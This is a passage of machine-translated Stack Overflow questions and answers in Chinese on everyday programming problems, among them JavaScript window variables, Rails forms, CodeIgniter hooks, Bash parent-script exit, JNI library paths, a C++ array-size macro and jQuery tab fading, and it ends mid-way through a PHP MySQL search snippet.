# javascript - 在新窗口中访问 JavaScript 变量

> ID：16215170
> 
> 赞同：2
> 
> 时间：2013-04-25T12:47:08.770
> 
> 标签：javascript, variables

这是我第一次尝试 JavaScript，所以如果事情有点混乱，我深表歉意。

我有两个 html 页面（Certificate1.html 和 Certificate2.html）。我正在尝试做的是提示用户在 Certificate1.html 上输入他/她的姓名，然后将该信息传递给 Certificate2.html。此时，用户的姓名将显示在他可以打印的证书中。

两个 html 页面都引用同一个 JavaScript 文件 (Certificate1.js)。第一个页面调用 passName()：

```
function passName() {
    FirstN = document.frmUserName.inFirstN.value;
    LastN = document.frmUserName.inLastN.value;
   // alert(FirstN); // good
   // alert(LastN); // good
    var Cert = window.open("Certificate2.html");
    Cert.FirstN = FirstN;
    Cert.LastN = LastN;
    //alert(Cert.FirstN); //good
    //alert(Cert.LastN); //good
} 
```

这似乎工作正常。我被卡住的地方是 Certificate2.html 调用的函数 placeName() 。我让它在 onLoad 上触发，我知道它正在正确访问该功能（我只是在那里发出警报并且它出现了）。我不知道如何访问我在 passName() 中传递给 Cert 的 FirstN 和 LastN 变量。我试过 document.FirstN 但我得到“未定义”。如何访问我（认为我）通过的 FirstN 和 LastN 变量？

谢谢！-克里斯汀

更新：

知道了！！！

我不需要通过 window.opener 访问它——我已经将变量传递给了窗口，所以我可以直接访问它们。

```
function placeName() {
    //alert(FirstN);
    document.getElementById("pUserName").innerHTML = FirstN + " " + LastN;
} 
```

多谢你们！！-克里斯汀

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T12:56:57.627

HTML 本地存储 (HTML5) [http://diveintohtml5.info/storage.html](http://diveintohtml5.info/storage.html)

在你的第一个文件中：

```
localStorage.setItem("FirstN", document.frmUserName.inFirstN.value); 
```

在第二个：

```
var FirstN = localStorage.getItem("FirstN"); 
```

或者简单地设置 Cookies...

[http://www.w3schools.com/js/js_cookies.asp](http://www.w3schools.com/js/js_cookies.asp)

但我认为这应该使用 PHP 或至少不是 JS 来完成

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T12:50:18.030

使用`window.opener`新窗口中的对象。

```
window.opener.FirstN 
```

[W3Schools 示例](http://www.w3schools.com/jsref/prop_win_opener.asp)

[我可以将 JavaScript 变量传递到另一个浏览器窗口吗？](https://stackoverflow.com/questions/87359/can-i-pass-a-javascript-variable-to-another-browser-window)

以下适用于我的设置：

第一个.html

```
<html>
 <script>
   var Var1 = "MyStringVar";
   var Var2 = 123;
   var win = window.open("second.html");
 </script>
</html> 
```

第二个.html

```
<html>
 <script>
   alert(window.opener.Var1);
   alert(window.opener.Var2);
 </script>
</html> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-26T13:18:28.617

更新：

知道了！！！

我不需要通过 window.opener 访问它——我已经将变量传递给了窗口，所以我可以直接访问它们。

```
function placeName() {
    //alert(FirstN);
    document.getElementById("pUserName").innerHTML = FirstN + " " + LastN;
} 
```

多谢你们！！-克里斯汀

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-01-14T07:36:31.413

*在第一个窗口文件中：*

window.yourVariable = 值；

*在第二个窗口文件中：*

window.opener.yourVariable

说明：将 yourVariable 声明为全局并将其绑定到父窗口。如果从父窗口打开新窗口，则可以从“window.opener”访问数据。由于 yourVariable 被声明为全局变量，因此可以使用“window.opener.yourVariable”从子窗口访问父窗口的值

# ruby-on-rails-3 - Rails 3 中的 Form_for 只考虑 AJAX 请求中带有 Form.serialize(this) 的第一个提交按钮

> ID：16215171
> 
> 赞同：0
> 
> 时间：2013-04-25T12:47:11.090
> 
> 标签：ruby-on-rails-3, form-for

我正在开发 Rails 3 应用程序。其中一个视图只有一个提交按钮，现在我应该再添加一个。我已经在视图文件 (.html.erb) 和 controller.rb 中完成了所有必要的更改。但是当单击任何一个按钮时，它只考虑第一个按钮（无论是哪个按钮）。

为什么只考虑第一个按钮？我怎样才能让两者都工作？

**编辑：** 我刚刚检查了 Railscast 视频
[http://railscasts.com/episodes/38-multibutton-form?autoplay=true](http://railscasts.com/episodes/38-multibutton-form?autoplay=true)

它谈到了多按钮表单，甚至提到**如果表单具有 AJAX 请求和表单序列化，**则需要进行一些更改。我的代码有它们！！

这是代码

[添加提交按钮调用早期按钮的功能本身](https://stackoverflow.com/questions/16188455/added-submit-button-calls-the-earlier-buttons-function-itself)

任何人都可以帮助我进行必要的更改，以便即使有序列化两个按钮都被考虑！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:55:43.327

您可以将名称添加到视图中的提交按钮，如下所示：

```
= submit_tag 'Done', :class => 'btn', :name => "done"
= submit_tag 'Save', :class => 'btn', :name => "save" 
```

和控制器：

```
if params[:done]
  # do something done
elsif params[:save]
  # do something save
end 
```

如果单击“完成”按钮，控制器将工作“完成”。

而你想要更瘦，可以观看 RailsCasts：[http: //railscasts.com/episodes/38-multibutton-form?autoplay=true](http://railscasts.com/episodes/38-multibutton-form?autoplay=true)

# php - 如何在 codeigniter 中更改站点语言

> ID：16215176
> 
> 赞同：0
> 
> 时间：2013-04-25T12:47:26.450
> 
> 标签：php, codeigniter, multilingual

我已经在 codeigniter 中开发了网站，现在我希望它是多语言的。

我遵循了使用钩子的教程。这是我的 hook.php

```
$hook['post_controller_constructor']=array(
                                   'class'=>'LanguageLoader',
                                   'function'=>'initialize',
                                   'filename'=>'LanguageLoader.php',
                                   'filepath'=>'hooks'
                                   ); 
```

我创建了一个类并将其放在 hooks 文件夹中。

```
class LangSwitch extends CI_Controller
{
    public function __construct()
    {
        parent::construct();
        $this->load->helper('url');
    }

   function switchLanguage($language="")
   {
       $language=($language!="") ? $language:"english"; 
       $this->session->set_userdata('site_lang',$language);
       redirect(base_url());
   }
} 
```

这是另一个文件，它也放置在 hooks 文件夹中

```
class LanguageLoader
{
    function initialize()
    {
        $CI=&get_instance();
        $CI->load->helper('language');
        $site_lang=$CI->session->userdata('site_lang');
        if($site_lang)
        {
            $CI->lang->load('dari','dari');
        }
        else
        {
            $CI->lang->load('english','english');
        }
    }
} 
```

这是我的视图文件。

```
<a href='<?=site_url('LangSwitcher/switchLanguage/english')?>'>English</a> 
```

它说“找不到请求的页面”。任何人都可以发现发生了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T12:55:50.260

您的控制器被调用`LangSwitch`，但在您的 url 中，**您**在`site_url(...)`. 如果您没有为此设置路线，那么那里可能是一个错字。

此外，`if($site_lang)`条件在`LanguageLoader`. 也许您想要其他支持`if ($site_lang == "dari")`的`elseif`语言或`switch()`

# java - 执行搜索后在 Jtable 上显示数据

> ID：16215185
> 
> 赞同：-1
> 
> 时间：2013-04-25T12:47:50.860
> 
> 标签：java, mysql, jdbc

基本上目前我的代码正在表中搜索名字或姓氏。完成搜索后，例如 'Peter' ，将发生的情况是将数据放入文本框中。

问题是我希望将数据显示在我的表格上，我已经尝试了很多次但它似乎不起作用，我尝试过使用这行代码。'table_stats' 是表的名称。table_stats.setModel(DbUtils.resultSetToTableModel(Result));

我对这个很陌生，请任何人帮忙，非常感谢谢谢！

```
private void searchKeyReleased(java.awt.event.KeyEvent evt) {                                   
    // TODO add your handling code here:
    try{
      String sql = "select * from statistics where first_name =? "  ;
       String sql2 = "select * from statistics where surname =? "  ;
      Prepared=conn.prepareStatement(sql);
      Prepared=conn.prepareStatement(sql2);
      Prepared.setString (1, search.getText());
      Result = Prepared.executeQuery();
      if(Result.next()){
          String add1 = Result.getString("player_id");
          player_id.setText(add1);
          String add2 = Result.getString("first_name");
          first_name.setText(add2);
          String add3 = Result.getString("surname");
          surname.setText(add3);
          String add4 = Result.getString("goal_scored");
          goal_scored.setText(add4);
          String add5 = Result.getString("assist");
          assist.setText(add5);

      }

    }
    catch(Exception e)

    {

    JOptionPane.showMessageDialog(null, e);
    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:30:42.923

我认为您可以使用 DefaultTableModel：（[http://docs.oracle.com/javase/7/docs/api/javax/swing/table/DefaultTableModel.html](http://docs.oracle.com/javase/7/docs/api/javax/swing/table/DefaultTableModel.html)）

或者您可以实现自己的 AbstractTableModel 子类：（[http://docs.oracle.com/javase/7/docs/api/javax/swing/table/AbstractTableModel.html](http://docs.oracle.com/javase/7/docs/api/javax/swing/table/AbstractTableModel.html)）

无论如何，您应该将查询数据库表之类的代码与您的 GUI 代码分开（例如，使用返回表模型的方法 getPlayers 创建一个单独的类）。

# google-caja - caja.appspot.com 是否缓存被哄骗的对象

> ID：16215186
> 
> 赞同：0
> 
> 时间：2013-04-25T12:47:50.870
> 
> 标签：google-caja

我正在开发一个使用 Google Caja 对我的 javascript 进行沙箱处理的网站。我正在使用 caja.appspot.com 的服务器来哄骗我的 html、js 和 css。然而，它似乎确实将被哄骗的对象缓存了一段时间，这在开发时非常烦人。对我来说，我更新的内容似乎需要大约五分钟才能被哄骗。如果是这种情况并且可以关闭它，现在有人吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-26T06:45:33.340

我在谷歌的 caja 讨论组上问了同样的问题，并在那里得到了答案。caja.appspot.com 缓存 url:s。然而，最大年龄现在改为 10 岁，这使得开发更加愉快。另一种解决方法是将唯一字符串附加到您哄骗的 URL，例如 ?id=345。

[https://groups.google.com/forum/?fromgroups=#!topic/google-caja-discuss/fZxJDQ5HL58](https://groups.google.com/forum/?fromgroups=#!topic/google-caja-discuss/fZxJDQ5HL58)

# git - 如何在 git 中创建一个干净的主题分支，它只有一个提交（并且没有从上游拉取）

> ID：16215189
> 
> 赞同：2
> 
> 时间：2013-04-25T12:48:30.283
> 
> 标签：git, github

## 分叉prezto

我将 sorin-ionescu/prezto ( `upstream`) 从 github 分叉到我的 github 帐户 (nasenatmer/prezto) ( `origin`)，将其克隆到本地并开始配置它，添加文件，同时不断提交并将更改推送回我的 github 存储库。

## 配置我的本地仓库

除其他事项外，我修改了一个提示主题，现在我想将其回馈给项目，因此我想创建一个拉取请求。从 github“使用拉取请求”和 gun.io 上的教程学习，我尝试创建主题分支，提交我的更改，以便我可以将它们作为拉取请求转发到 github。但是，与此同时，上游也有更新。

所以我有以下提交历史： `original checkout - - many "private commits" - - - pull upstream changes`

## 创建主题存储库

因此，为了创建一个主题存储库，我在我最早的上游克隆中创建了一个分支，我调用了`pristine`它并且我不会自定义它自己。然后我退出`upstream`以`pristine`更新。

从那时起，我分支`prompt_jakob_setup`（这是提示文件的名称）并将文件提交给它。

## 提交过多的问题

现在，如果我`github`从我的主题分支开始拉取请求，我总是会看到从今天开始的[两个提交](http://git.io/aGPCkg)：拉入`upstream`和我的提示提交。

我认为任何维护者都不会接受这种不专业的拉取请求？

## 问题

什么是创建一个干净的主题分支的正确方法，它只有一个你想要推送到上游的提交？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:12:58.953

如果你不想要你想要的上游合并`git rebase upstream master`。

你也可以这样做`git pull --rebase upstream master`。这将做一个`fetch`之前`rebase`，以便您确定您是最新的。

这会将您的提交移至上游 repo 上发生的任何提交之后。并且不显示您关心的提交消息。如果您想更改当前存储库，您将需要`git reset --hard`提交（从上游撤消合并），然后继续`git rebase`. 如果您已将这些更改推送到您自己在 GitHub 上的存储库中，您可能必须这样做以`git push --force`覆盖历史记录。（我通常建议不要这样做，但因为它是你的回购，它应该没问题。）

# bash - Bash - 从子脚本中退出父脚本

> ID：16215196
> 
> 赞同：18
> 
> 时间：2013-04-25T12:48:48.633
> 
> 标签：bash

我有一个 Bash 父脚本，它在意外输入时调用一个记录错误的错误日志子脚本。我还希望在发生错误并调用错误脚本时停止执行。但是，如果我`exit`从错误处理脚本中调用它并不会停止父脚本的执行。我该如何停止孩子的父脚本？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-25T12:58:49.677

尝试..

```
#normal flow
[[ $(check_error_condition) ]] && /some/error_reporter.sh || exit 1 
```

所以，

*   当 error_reporter 以退出状态 > 0 退出时，父级也将终止
*   如果 error_reporter 将以 status = 0 退出，则父级继续...

你不想要`stop the parent from a child`（*父母通常不喜欢这种行为*）:)，你想要`tell to parent - need stop`，他会停止自己（如果想要的话）;)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-04-25T13:04:31.660

尝试：

在父脚本中：

```
trap "echo exitting because my child killed me.>&2;exit" SIGUSR1 
```

在子脚本中：

```
kill -SIGUSR1 `ps --pid $$ -oppid=`; exit 
```

* * *

另一种方法是：

在子脚本中：

```
kill -9 `ps --pid $$ -oppid=`; exit 
```

但是，不建议这样做，因为父母需要一些关于被杀的信息，因此如果需要，请进行一些清理。

* * *

另一种方式：而不是调用子脚本，`exec`它。

* * *

但是，正如在其他答案中指出的那样，最干净的方法是在孩子返回后从父母那里退出。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T12:57:15.800

不要试图从孩子中终止父母。而是`exit`在子脚本返回后调用父级。

```
if [ condition ]; then
  /path/to/child.sh
  exit 1
fi 
```

或更短

```
[ condition ] && { /path/to/child.sh; exit 1; } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-12-27T07:51:16.740

@anishsane 注释的扩展，因为 MacOS 的`ps`语法略有不同。

在 Mac OS (Darwin) 下的子脚本中查找父进程 ID (ppid)：

`kill -SIGUSR1 $(ps $$ -o ppid=);exit`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-11-23T19:09:45.987

根据您的需要， `set -e` 在脚本顶部使用可能是一个不错的解决方案。如果任何命令（例如，您的错误检查脚本）以非零退出代码（[https://vaneyckt.io/posts/safer_bash_scripts_with_set_euxo_pipefail/](https://vaneyckt.io/posts/safer_bash_scripts_with_set_euxo_pipefail/)）退出，这将自动导致脚本退出

请注意，在正常情况下，有一些常见的命令具有非零退出代码。

# java - System.loadLibrary 不起作用。链中第二个库的 UnsatisfiedLinkError

> ID：16215197
> 
> 赞同：8
> 
> 时间：2013-04-25T12:48:51.787
> 
> 标签：java, java-native-interface, loadlibrary, unsatisfiedlinkerror, java.library.path

我有通过 JNI 使用 cpp 共享库 libclient.so 的 java 程序 Client.class。libclient.so 构建为共享并使用 cpp 共享库 libhttp.so。

libclient.so 和 libhttp.so 放在文件夹`/home/client/lib64`
Client.class 放在`/home/client/bin`

客户端可以加载库

1.  System.load 和环境变量 LD_LIBRARY_PATH
2.  System.loadLibrary 和 -Djava.library.path

第一种方法效果很好。

`export LD_LIBRARY_PATH = /home/client/lib64`

java -classpath ./bin 客户端

第二种方式失败。

`java -classpath ./bin -Djava.library.path=./../lib64 Client`

```
java.lang.UnsatisfiedLinkError: /home/client/lib64/libclient.so: libhttp.so: cannot open shared object file: No such file or directory 
```

当我将 libhttp.so 放入 /usr/lib64 时，第二种方法可以正常工作。

**如果我使用 System.loadLibrary，为什么 libclient.so 会在 /usr/lib64 中寻找 libhttp.so？如何在不将 libhttp.so 复制到 /usr/lib64 的情况下修复它？**

*我的加载代码：*

```
 //Try load from -Djava.library.path        
    boolean found = false;
    String lib = "client";
    try {
       System.loadLibrary(lib);
       found = true;
    } catch (UnsatisfiedLinkError e) {
       e.printStackTrace();
    }
    //Try load from LD_LIBRARY_PATH
    if (!found) {
       lib = "libclient.so";
       String ld_lib_path = System.getenv("LD_LIBRARY_PATH");
       String[] paths = ld_lib_path.split(":");
       for(int i=0; i<paths.length; i++) {
          String p = paths[i];
          File x = new File(p, lib);
          if (x.exists()) {
             System.load(x.getAbsolutePath());
             found = true;
             break;
          }
       }
    } 
```

附加信息。

如果我用 ldd 测试 libclient.so，我会看到：libhttp.so => not found 如果我设置 export LD_LIBRARY_PATH = /home/client/lib64，那么我会看到：libhttp.so => /home/client/lib64/libhttp.so

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-26T10:33:20.670

原因是 libclient.so 是从您的 JVM 加载的，它在`java.library.path`. 但是，当 libclient.so 尝试加载 libhttp.so 时，它对 Java 一无所知，只是使用常规的 Linux 加载共享库的方式（动态链接器`ld.so`），它会查找`LD_LIBRARY_PATH`一些常见的目录，如`/usr/lib64`.

我可能会`LD_LIBRARY_PATH`从 Java 应用程序的启动脚本中使用 set。如果您不想使用启动脚本，理论上您可以`LD_LIBRARY_PATH`从进程本身中设置。但是，Java 不允许这样做（只有`System.getenv()`，没有`System.setenv()`），因此您需要编写一个从 Java 调用并调用[`putenv()`](http://man7.org/linux/man-pages/man3/putenv.3.html)setting的小型 C 库`LD_LIBRARY_PATH`。

如果您自己构建`libclient.so`，您可以使用`-rpath`链接器标志来指定动态链接器应该查找更多所需库的路径。请注意，如果您在此处指定相对路径，它将被解释为相对于正在运行的应用程序的当前工作目录，而不是相对于`libclient.so`. 为此，您需要将其`$ORIGIN`用作参数`-rpath`并注意您的外壳不会扩展它。

所以，如果你想拥有`libclient.so`和`libhttp.so`在同一个目录下，你需要使用

```
-rpath '$ORIGIN' 
```

在构建时作为链接器的参数`libclient.so`。如果不直接调用链接器而是让编译器调用它，则需要在编译器的命令行中添加以下内容：

```
-Wl,-rpath,'$ORIGIN' 
```

有关这方面的更多信息，请[参见`ld.so`](http://linux.die.net/man/8/ld.so).

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-26T07:24:51.220

这个问题我没有很好的答案。

但我找到了几个好方法。

1.  将 libhttp.so 放入库的共享位置，例如 /usr/lib64。
2.  将 libhttp.so 的路径放入 LD_LIBRARY_PATH。
3.  使用 libhttp.so 构建 libclient.so。
4.  在构建 libclient.so 期间使用 -rpath。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-06-14T16:38:54.237

为了正确查找不同操作系统的库（来自*java.library.path*）必须具有不同的名称：

*   Linux：*libhttp.so*
*   视窗：*http.dll*

比你可以从 Java 调用：

```
System.loadLibrary( "http" ); 
```

# c++ - C++获取数组大小的意义

> ID：16215199
> 
> 赞同：8
> 
> 时间：2013-04-25T12:48:56.307
> 
> 标签：c++, arrays

这是获取数组大小的宏

```
#define array_size(array) \
(sizeof( array ) / (sizeof( array[0] ) * (sizeof( array ) != sizeof(void*) || sizeof( array[0] ) <= sizeof(void*))) 
```

我认为通常 (sizeof(array) / (sizeof(array[0])) 足以获得数组的大小。

我猜那个部分

```
(sizeof( array[0] ) * (sizeof( array ) != sizeof(void*) || sizeof( array[0] ) <= sizeof(void*)) 
```

是为了避免整件事除以零，任何人都可以帮忙解释一下吗？

提前致谢。

干杯，

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-25T13:07:44.290

`sizeof array[0]`在除数中乘以

```
(sizeof( array ) != sizeof(void*) || sizeof( array[0] ) <= sizeof(void*)) 
```

使除数为零，如果

```
sizeof array == sizeof(void*) 
```

*和*

```
sizeof array[0] > sizeof(void*) 
```

在这些情况下，在编译过程中会被零除，这会导致编译失败。

这些检查是一种尝试检测作为指针的参数（无论它们是否是数组到指针转换的结果），因为使用该商无法知道指针指向的“数组”有多大。

如果其他指针类型的大小与 不同，它会失败`void*`，并且它不会检测到指向不大于`void*`s 的事物的指针。通过使作者陷入虚假的安全感，它可能弊大于利。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-25T13:38:10.010

> 我认为通常 (sizeof(array) / (sizeof(array[0])) 足以获得数组的大小。

虽然这不是你的主要问题，但你提到了它。在 C++ 中确定数组大小的正确方法是使用模板：

```
template<typename T, size_t size>
constexpr size_t array_size(T(&)[size]){
    return size;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T13:22:17.780

我认为这部分很清楚：`sizeof( array ) / sizeof( array[0] )`

这部分`(sizeof( array ) != sizeof(void*) || sizeof( array[0] ) <= sizeof(void*))`是一个逻辑表达式，因此产生真或假。在计算整个表达式时，`sizeof( array[0] )`与逻辑表达式相乘，编译器将逻辑表达式转换为 0 或 1。所以你最终得到
`sizeof( array ) / (sizeof( array[0] ) * 1)`or
`sizeof( array ) / (sizeof( array[0] ) * 0)`。

第一种情况是正常和期望的情况。第二种情况会给你一个编译器错误，因为被零除。因此，如果您调用例如，代码将无法编译：

```
long *p; // assuming a platform with sizeof(long)==sizeof(void*)
array_size(p); 
```

但它不会捕获如下错误：

```
char *p;
array_size(p); 
```

对于我希望它编译的情况，它将无法编译：

```
long x[1]; // assuming a platform with sizeof(long)==sizeof(void*)
array_size(x); 
```

顺便说一句，如果您将此函数声明为宏（在 C++ 中，我真的更喜欢模板样式解决方案），您应该`array`将宏中的所有内容更改为`(array)`.

# javascript - 使用基本 jQuery 选项卡的 FadeIn / FadeOut 故障

> ID：16215200
> 
> 赞同：1
> 
> 时间：2013-04-25T12:48:57.087
> 
> 标签：javascript, jquery, html, css, tabs

我正在**使用 jQuery 开发一个非常简单的 fadeIn / fadeOut 选项卡系统**，但是，它并不像我希望的那样流畅。

这是我的**[演示](http://jsfiddle.net/j4eFE/1/)**，供您查看它的实际应用。

看看演示。我希望它会相互淡入和淡出，但是如果您单击**Tab 1 > Tab 2 > Tab 3**然后返回**Tab 1**，沿途会出现奇怪的淡入/淡出故障。

任何想法我如何解决这个问题？我的**jQuery**是：

```
$(document).ready(function(){

        $('ul.tabs').each(function(){

            var $active, $content, $links = $(this).find('a');

            $active = $($links.filter('[href="'+location.hash+'"]')[0] || $links[0]);
            $active.addClass('active');
            $content = $($active.attr('href'));

            $links.not($active).each(function () {
                $($(this).attr('href')).hide();
            });

            $(this).on('click', 'a', function(e){

                $active.removeClass('active');
                $content.fadeOut("slow");

                $active = $(this);
                $content = $($(this).attr('href'));

                $active.addClass('active');
                $content.fadeIn("slow");

                e.preventDefault();
            });
        });

    }); 
```

我的**HTML**是：

```
<ul class="tabs">
    <li><a href="#tab1">Overview</a></li>
    <li><a href="#tab2">Sub Nav 2</a></li>
    <li><a href="#tab3">Sub Nav 3</a></li>
</ul>

<div id="tab1">
    <p>this is a test 1</p>
</div>
<div id="tab2">
    <p>this is a test 2</p>
</div>
<div id="tab3">
    <p>this is a test 3</p>
</div> 
```

非常感谢任何指针:-)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T12:54:14.217

您需要在代码完成淡出后进行回调。目前，代码将在淡出完成之前执行淡入。为了级联调用，您可以提供一个函数作为[fadeOut](http://api.jquery.com/fadeOut/)的第二个参数。此函数将在函数完成动画后立即调用。就我而言，我提供了一个匿名函数来执行剩余代码。

```
$content.fadeOut("slow", function()
                                 {
                                     $active = $(c);
                                     $content = $($(c).attr('href'));

                                     $active.addClass('active');
                                     $content.fadeIn("slow");
                                 }); 
```

我已经更新了你的小提琴。使用正确的代码修改。

[http://jsfiddle.net/R8yQV/](http://jsfiddle.net/R8yQV/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T12:52:44.223

如果您希望它们彼此重叠淡入淡出，则必须将它们彼此重叠放置。否则，它们会在文档的正常流程中彼此相邻放置，因此您会遇到奇怪的行为，即新项目从一侧开始，然后在消失的项目最终设置为时向左滑动`display: none`。尝试使用`position: absolute`将项目放置在彼此的顶部。然后淡入/淡出应该做你想要的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T13:26:12.040

而不是`div {float:left;}`在你的 jsfiddle 的 css 中，使用`div{position:absolute;}` [http://jsfiddle.net/j4eFE/11/](http://jsfiddle.net/j4eFE/11/)

使用它，您的淡入和淡出将同时发生，并且看起来非常平滑。

# c# - 一分钟后重新调用异步控制器操作

> ID：16215205
> 
> 赞同：0
> 
> 时间：2013-04-25T12:49:14.667
> 
> 标签：c#, .net, asp.net-mvc, asynchronous

我对处理 csv 文件的 MVC3 异步控制器有一个操作，其中的异步部分如下：

```
 [HandleError]
  [NoAsyncTimeout]
  public void UploadAsync(int jobId)
  {
      var timestamp = DateTime.Now;
      Log.Debug("UploadAsync " + timestamp);

      var job = _fileUploadService.GetJob(jobId);

      Log.Debug("AsyncManager.OutstandingOperations.Increment " + timestamp);
      AsyncManager.OutstandingOperations.Increment();

      var task = Task<Job>.Factory.StartNew(() => {
            Thread.Sleep(90000);
      });

      task.ContinueWith(t =>
      {
         try 
         {
              AsyncManager.Parameters["Results"] = GetJobResultDetails(jobId);
          }
          //no "catch" block.  "Task" takes care of this for us.
          finally
          {
              AsyncManager.OutstandingOperations.Decrement();
          }
      });
  } 
```

完成的对应物是：

```
 public JsonResult UploadCompleted(int jobId)
  {
      Log.Debug("UploadCompleted");

      try
      {
          return AsyncManager.Parameters.ContainsKey("Results")
                     ? Json(AsyncManager.Parameters["Results"],
                                JsonRequestBehavior.AllowGet)
                     : Json("", JsonRequestBehavior.AllowGet);
      }
      catch (Exception ex)
      {
          ExceptionHelper.LogError(ex, Log, "message");
         return Json("");
      }
  } 
```

当 ProcessJob(job) 任务花费不到一分钟时，这可以正常工作。一分钟后，同一任务在单独的线程上再次启动，处理与当前正在运行的任务相同的作业。

异步控制器方法或可能导致此行为的任务的超时设置是否有任何明显的遗漏？

编辑-

我将进程作业的调用换成了一个线程。睡眠一分半钟，当我查看日志时，我可以看到 UploadAsync 仍然被调用了两次，因此它与 ProcessJob 执行的代码无关。

值得注意的是，这只发生在部署到集成服务器而不是本地时。

是否存在需要升级以适应较长处理时间的 IIS 设置？

编辑 -

使用 Ajax 调用 UploadAsync：

```
 $(document).ready(function () {
    $("#JobIdToProcess").text(@Model.JobIdToProcess);
    var jobId = $("#JobIdToProcess").text();

    if (jobId.charAt(0)) {
      process(jobId);
    }
});

function process(jobId) {
    alert("process called");
    $.ajax({
        type: "GET",
        url: makeUrl('~@string.Format("/{0}/{1}", "FileUpload", "Upload")' 
                                                          + "/" + jobId),
        contentType: "application/json; charset=utf-8",
        dataType: "json",
        beforeSend: function(xhr) {
            $(window).bind('beforeunload', function() {
                xhr.abort();
            });
        },
        traditional: true,
        success: function (data) {
            var uploadResults = $.parseJSON(data);
            var completedDate = formatDate(uploadResults[0].CompletedDate);

            $("#CompletedDate" + jobId).html(completedDate);
        }
    });
} 
```

# google-maps - 使用 ASP.NET MVC4 的谷歌地图 api 中的 url 标记

> ID：16215215
> 
> 赞同：0
> 
> 时间：2013-04-25T12:49:41.567
> 
> 标签：google-maps, asp.net-mvc-4

我的页面中有一个地图，当单击标记时，它会转到 RptVendedorController 中的一个动作气球，就像这样，

```
public ActionResult Balloon( int id,string tipoPin , bool clienteCompleto) 
```

对于我这样创建的标记的网址

```
Url.Action("Balloon", "RptVendedor", new { id = cliente.ClienteId, tipoPin = "clientes", clienteCompleto = true }) } 
```

在服务器端给出这个

> url:/RptVendor/Balloon/4?tipoPin=clientes&clienteCompleto=True

我的问题是，由于某种原因，网址发生了变化，当我单击标记时，这是我得到的网址（在下面）它添加（amp;）所以它没有击中我的动作，因为它没有很好地格式化查询中的 clientecompleto细绳

```
Request URL:http://localhost:10657/RptVendedor/Balloon/4?tipoPin=clientes&amp;clienteCompleto=True 
```

并且不知道它添加（amp;）的原因？

编辑

我把一个viewModel

```
Globo = new MostrarMapaGlobo { Ancho = 400, Alto = 200, Url = Url.Action("Balloon", "RptVendedor", new { id = cliente.ClienteId, tipoPin = "clienteGeografico" }) } 
```

并且在局部视图中

```
@foreach (var pin in Model.Pines)
        {
            <text>
            var marker = new google.maps.Marker({
                position: new google.maps.LatLng(@pin.Posicion.Latitud, @pin.Posicion.Longitud),
                map: map,
                title: '@pin.AltText',
                icon: new google.maps.MarkerImage('@Html.Raw(pin.Icono.Replace("[color]", pin.Color.Substring(1)))'),
                @if (pin.Click)
                {
                    @:clickable: true,
                }
                else
                {
                    @:clickable: false,
                }
                @if(pin.Movil)
                {
                    @:draggable: true,
                }
                else
                {
                    @:draggable: false,
                }

                @if (!string.IsNullOrWhiteSpace(pin.Globo.Extras))
                {
                    @pin.Globo.Extras@:,
                }
                ancho: '@pin.Globo.Ancho' + 'px',
                alto: '@pin.Globo.Alto' + 'px',
                url: '@pin.Globo.Url',
                contenido: '@pin.Globo.Contenido'
            });
            oms.addMarker(marker);
            markers.push(marker);
            </text>
                if (Model.Ruta != null && pin.Ruta)
                {
                @:posiciones.push(new google.maps.LatLng(@pin.Posicion.Latitud, @pin.Posicion.Longitud));                            
            }
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:12:11.970

好的，在这里您应该使用以下命令进行转义`Html.Raw`：

```
...
url: '@Html.Raw(pin.Globo.Url)',
... 
```

# php - 使 mysql 数据库搜索的结果可选

> ID：16215216
> 
> 赞同：0
> 
> 时间：2013-04-25T12:49:44.830
> 
> 标签：php, html, mysql

我有一个包含库存商品的数据库和一个网页，允许您在数据库中搜索商品类型或特定商品编号。结果将返回并显示在搜索表单下的表格中。

目前，我通过将 mysql 查询的结果保存到数组中，然后将数组的结果打印到表中来做到这一点。

如何使结果可选，然后有一个按钮，例如“添加”，它允许我仅基于所选项目从数据库中检索信息。

编辑 -

```
<?php
require("header.php");
if(isset($_REQUEST['searching'])){ //check if form has been submitted
connect('final');//connect to DB
//set the values from search form
$field = $_POST['field'];
$query = $_POST['query']; 

    $query = htmlspecialchars($query); // stop HTML characters
    $query = mysql_real_escape_string($query); //stop SQL injection

     $data = mysql_query("SELECT *
     FROM stock 
     WHERE stock.Part_Number IN (SELECT stock.Part_Number
     FROM stock
     WHERE upper(stock.$field) LIKE'%$query%')") ;//query the DB with search field in colleumn selected//

     //$data = mysql_query("SELECT * FROM customer INNER JOIN address ON customer.ID = address.Customer_ID LEFT OUTER JOIN sites ON address.ID = sites.address_ID WHERE upper(customer.$field) LIKE'%$query%'") ;

    if($data === FALSE) {
    $error = 'Query error:'.mysql_error();
    echo $error;
    }
    else
    {

    $test = array();
    $colNames = array();
    while($results = mysql_fetch_assoc($data)){// puts data from database into array, loops until no more

    $test[] = $results;

        }
    $colNames = array_keys(reset($test));

        $anymatches=mysql_num_rows($data); //checks if the querys returned any results
            if ($anymatches == 0) 
                    { 
